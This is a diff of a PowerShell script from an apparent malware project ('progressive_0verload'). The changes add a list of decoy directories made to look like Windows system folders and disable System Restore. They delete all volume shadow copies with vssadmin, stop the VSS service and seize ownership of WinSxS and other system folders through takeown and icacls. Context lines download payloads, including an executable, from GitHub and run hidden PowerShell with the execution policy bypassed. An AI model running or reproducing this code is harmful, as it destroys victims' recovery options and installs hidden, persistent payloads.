@@ -9,7 +9,61 @@ if(-not (([System.Security.Principal.WindowsPrincipal][System.Security.Principal
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde.exe"
-$paths = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
+$paths =  @(
+    "$env:windir\system32\config\systemprofile\AppData\Local",
+    "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
+    "$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp",
+    "$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy",
+    "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload",
+    "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore",
+    "$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived",
+    "$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",
+    "$env:APPDATA\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump",
+    "C:\Recovery",
+    "$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile",
+    "$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch",
+    "$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore",
+    "$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump",
+    "$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump",
+    "$env:windir\system32\spool\drivers\x64\3\en-US",
+    "$env:windir\WinSxS\Temp\PendingRenames\Pending\ManifestCache",
+    ($env:windir + '\WinSxS\FileMaps\$$$\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces'),
+    "$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug",
+    "$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache",
+    "$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump",
+    "$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs",
+    "$env:windir\WinSxS\Manifests\wow64_microsoft_windows_ability_assistant_db_31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles"
+    "$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports",
+    "$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache",
+    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates",
+    "$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07",
+    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f",
+    "$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef",
+    "$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42",
+    "$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89",
+    "$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5",
+    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
+    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp",
+    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
+)
+
+$ownership = @(
+    "$env:windir\WinSxS",
+    "$env:windir\WinSxS\FileMaps",
+    "$env:windir\WinSxS\Catalogs",
+    "$env:windir\WinSxS\Manifests",
+    "$env:windir\WinSxS\Temp",
+    "$env:windir\WinSxS\ManifestCache",
+    "$env:windir\WinSxS\Backup",
+    "$env:windir\ServiceProfiles\LocalService",
+    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft",
+    "$env:windir\system32\LogFiles\WMI\RtBackup",
+    "$env:windir\System32\DriverStore\FileRepository",
+    "$env:ProgramData\Microsoft\Windows\AppRepository"
+)
+Disable-ComputerRestore -Drive "$env:systemdrive\"
+vssadmin delete shadows /for=$env:systemdrive /all /quiet | Out-Null
+net stop vss
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
 $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
@@ -26,6 +80,7 @@ $p = Get-Random -Count $ms.Length -In (1..1369)
 $score = Get-Random -Minimum 184 -Maximum 1023
 $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
 iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
 iwr -Uri $initFinde -OutFile $initFindePath
@@ -55,7 +110,36 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidde
 
 
 
+foreach ($path in $ownership) {
+    if($path -eq "$env:windir\WinSxS\ManifestCache"){
+        if(-not(Test-Path -Path "$env:windir\WinSxS\ManifestCache" -PathType Container)){
+            New-Item -Path "$path" -ItemType Directory -Force
+        }
+    }
+    takeown /f "$path"
+    icacls "$path" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:r /q
+}
 
+foreach($path in $paths){
+    if(-not(Test-Path -Path "$path" -PathType Container)){
+        New-Item -Path "$path" -ItemType Directory -Force
+    }
+}
+
+foreach($path in $paths){
+    try{
+        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/random1.txt" -OutFile "$path\text.txt"
+    }catch{
+        Write-Output "ERROR: $_"
+        # takeown /f "$path"
+        # icacls "$path" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:r /q
+        # try{
+        #     iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/random1.txt" -OutFile "$path\text.txt"
+        # }catch{
+        #     $paths = $paths | Where-Object{$_ -ne $path}
+        # }
+    }
+}
 
 
 
